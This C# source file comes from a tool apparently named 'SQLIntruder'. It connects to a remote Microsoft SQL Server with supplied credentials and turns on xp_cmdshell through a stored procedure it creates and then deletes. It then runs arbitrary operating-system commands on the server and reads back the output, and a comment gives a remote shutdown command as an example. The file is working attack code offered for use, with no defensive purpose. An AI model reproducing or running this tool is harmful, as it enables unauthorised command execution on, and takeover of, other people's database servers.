using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Data;
using System.Windows.Forms;
namespace SQLIntruder
{
    /// <summary>
    /// 提供链接，执行SQL命令等服务的类
    /// </summary>
    class SQLSrvProvider
    {
        /// <summary>
        /// 服务器ip地址
        /// </summary>
        private string serverIP;
        /// <summary>
        /// 用户名
        /// </summary>
        private string userName;
        /// <summary>
        /// 密码
        /// </summary>
        private string password;
        /// <summary>
        /// 数据库名称
        /// </summary>
        private string databaseName;
        /// <summary>
        /// 要连接的端口
        /// </summary>
        private int port;
        /// <summary>
        /// 私有的，连接到SQL server的连接对象
        /// </summary>
        private SqlConnection con;
        private SqlCommand cmd;
        private string SQLResult;

        //开启SQL xp_cmdshell的sql命令

        public const string OPEN_XP_CMDSHELL = @"create procedure Fuck
as
exec sp_configure 'show advanced options',1
reconfigure
exec sp_configure 'xp_cmdshell',1
reconfigure
";
        public const string EXEC_SP = @"Fuck";
        public const string DELETE_SP = @"drop procedure Fuck";
        private const string XP_CMDSHELL = @"exec xp_cmdshell";

        /// <summary>
        /// 构造函数，用于初始化参数
        /// </summary>
        /// <param name="_serverIP">ip地址</param>
        /// <param name="_userName">用户名</param>
        /// <param name="_password">密码</param>
        /// <param name="_databaseName">数据库名称</param>
        /// <param name="_port">端口</param>
        public SQLSrvProvider(string _serverIP, string _userName, string _password, string _databaseName, int _port = 1433)
        {
            //设置好各个参数,此处的（SQL server）端口默认是1433
            //Trim()，去掉不必要的空格
            serverIP = _serverIP.Trim();//ip地址
            userName = _userName.Trim();//用户名
            password = _password.Trim();//密码
            databaseName = _databaseName.Trim();//数据库名称
            port = _port;//端口
            //分配内存
            con = new SqlConnection();
            cmd = new SqlCommand();
            SQLResult = "";
        }


        /// <summary>
        /// 构建连接字符串
        /// </summary>
        /// <returns>返回连接SQL server字符串</returns>
        private string BuildConnentString()
        {
            //字符串
            string result = "Server=" + serverIP + "," + port + ";" +
                            "Database=" + databaseName + ";" +
                            "uid=" + userName + ";" +
                            "pwd=" + password + ";" +
                            "Connect Timeout=3";

            return result;
        }

        /// <summary>
        /// 获取反馈结果
        /// </summary>
        /// <returns>反馈结果</returns>
        public string GetSQLResult()
        {
            return SQLResult;
        }

        /// <summary>
        /// 远程执行cmd命令
        /// </summary>
        /// <param name="cmdshell">需要的cmd指令</param>
        public bool ExecRemoteCMD(string cmdshell,bool IsNewVersionSQL=true)//需要判断SQL 版本，为true,SQL server 2008,否则为 SQL server 2005
        {

            //开启xp_cmdshell
            //新版本
            if (IsNewVersionSQL)
            {
                try
                {
                    con.ConnectionString = BuildConnentString(); //设置连接字符串
                    con.Open();   //打开连接
                    cmd.Connection = con; //设置连接对象
                    cmd.CommandText = OPEN_XP_CMDSHELL;//设置SQL命令
                    cmd.ExecuteNonQuery();//执行SQL命令
                                          /*--------------重新设置*/
                    cmd.CommandType = CommandType.StoredProcedure;//设置类型为存储过程
                    cmd.CommandText = EXEC_SP; //执行存储过程
                    cmd.ExecuteNonQuery();
                    cmd.CommandType = CommandType.Text;
                    cmd.CommandText = DELETE_SP;  //删除存储过程
                    cmd.ExecuteNonQuery();

                    //开始远程执行命令
                    //构建远程cmd语句 e.g. exec xp_cmdshell 'shutdown -s -t 10'
                    cmd.CommandText = XP_CMDSHELL + @"'" + cmdshell + @"'";
                    //开始执行
                    cmd.ExecuteNonQuery();

                    SqlDataReader read = cmd.ExecuteReader();//读取
                    while (read.Read())
                    {
                        try
                        {
                            SQLResult += read.GetString(0) + "\r\n";
                        }
                        catch (Exception) { continue; }
                    }
                    con.Close();
                }
                catch (Exception) { return false; }
                return true;
            }//老版本
            else
            {
                try
                {
                    con.ConnectionString = "server=" + serverIP + ";" + "database=" + databaseName + ";" + "Trusted_Connection = SSPI;"; //设置连接字符串
                    con.Open();                                  //打开连接
                    cmd.Connection = con;                        //设置连接对象
                    //直接执行xp_cmdshell
                    cmd.CommandText = XP_CMDSHELL + @"'" + cmdshell + @"'";
                    cmd.ExecuteNonQuery();                       //执行
                    SqlDataReader read = cmd.ExecuteReader();    //读取
                    while (read.Read())
                    {
                        try
                        {
                            SQLResult += read.GetString(0) + "\r\n";
                        }
                        catch (Exception) { continue; }
                    }
                    con.Close();                                   //关闭连接
                }
                catch (Exception) { return false; }
                return true;
            }
        }
    }
}
